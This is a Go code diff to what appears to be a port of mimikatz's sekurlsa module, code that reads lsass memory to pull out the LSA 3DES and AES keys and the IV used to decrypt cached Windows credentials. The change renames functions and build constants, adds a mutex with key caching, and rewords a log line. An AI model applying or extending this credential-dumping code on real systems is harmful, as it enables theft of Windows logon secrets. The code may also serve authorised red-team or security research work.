@@ -122,7 +122,7 @@ var (
 			offsets: &patchOffsets{off0: 5, off1: -69, off2: -18},
 		},
 		{
-			minBuild: buildWinBlue,
+			minBuild: buildWin81,
 			search: &patchPattern{
 				length: len(patternWinAllX86LSAInitProtectedMemoryKey),
 				data:   patternWinAllX86LSAInitProtectedMemoryKey,
@@ -146,6 +146,11 @@ var (
 // https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
 
 func (lsa *lsaNT6) acquireKeys(pHandle windows.Handle) error {
+	lsa.mu.Lock()
+	defer lsa.mu.Unlock()
+	if len(lsa.iv) == 16 && lsa.key3DES != nil && lsa.keyAES != nil {
+		return nil
+	}
 	lsasrv, err := lsa.ctx.lsass.GetBasicModuleInfo(pHandle, "lsasrv.dll")
 	if err != nil {
 		return err
@@ -184,13 +189,13 @@ func (lsa *lsaNT6) acquireKeys(pHandle windows.Handle) error {
 	lsa.log(logger.Debug, "iv data:", lsa.iv)
 	// acquire 3DES key
 	address = lsasrv.address + uintptr(index+patch.offsets.off1)
-	err = lsa.acquireNT6LSAKey(pHandle, address, "3DES")
+	err = lsa.acquireKey(pHandle, address, "3DES")
 	if err != nil {
 		return errors.WithMessage(err, "failed to acquire 3DES key")
 	}
 	// acquire AES key
 	address = lsasrv.address + uintptr(index+patch.offsets.off2)
-	err = lsa.acquireNT6LSAKey(pHandle, address, "AES")
+	err = lsa.acquireKey(pHandle, address, "AES")
 	if err != nil {
 		return errors.WithMessage(err, "failed to acquire AES key")
 	}
@@ -253,7 +258,7 @@ type hardKey struct {
 	data   [4]byte // self append, not used
 }
 
-func (lsa *lsaNT6) acquireNT6LSAKey(pHandle windows.Handle, address uintptr, algorithm string) error {
+func (lsa *lsaNT6) acquireKey(pHandle windows.Handle, address uintptr, algorithm string) error {
 	const (
 		bhKeyTag = 0x55555552 // U U U R
 		bKeyTag  = 0x4D53534B // M S S K
@@ -281,16 +286,16 @@ func (lsa *lsaNT6) acquireNT6LSAKey(pHandle windows.Handle, address uintptr, alg
 		return errors.New("read invalid bcrypt handle key")
 	}
 	// read hard key data
-	_, _, build := lsa.ctx.getWindowsVersion()
 	var (
 		bcryptKeySize   uintptr
 		bcryptKeyOffset uintptr
 	)
+	_, _, build := lsa.ctx.getWindowsVersion()
 	switch {
 	case build < buildMinWin8:
 		bcryptKeySize = unsafe.Sizeof(bcryptKey{})
 		bcryptKeyOffset = unsafe.Offsetof(bcryptKey{}.hardKey)
-	case build < buildMinWinBlue:
+	case build < buildMinWin81:
 		bcryptKeySize = unsafe.Sizeof(bcryptKey8{})
 		bcryptKeyOffset = unsafe.Offsetof(bcryptKey8{}.hardKey)
 	default:
@@ -312,7 +317,7 @@ func (lsa *lsaNT6) acquireNT6LSAKey(pHandle windows.Handle, address uintptr, alg
 	if err != nil {
 		return errors.WithMessage(err, "failed to read bcrypt handle key")
 	}
-	lsa.logf(logger.Debug, "%s hard key data: 0x%X", algorithm, hardKeyData)
+	lsa.logf(logger.Debug, "%s hard key: 0x%X", algorithm, hardKeyData)
 	return lsa.generateSymmetricKey(hardKeyData, algorithm)
 }
 
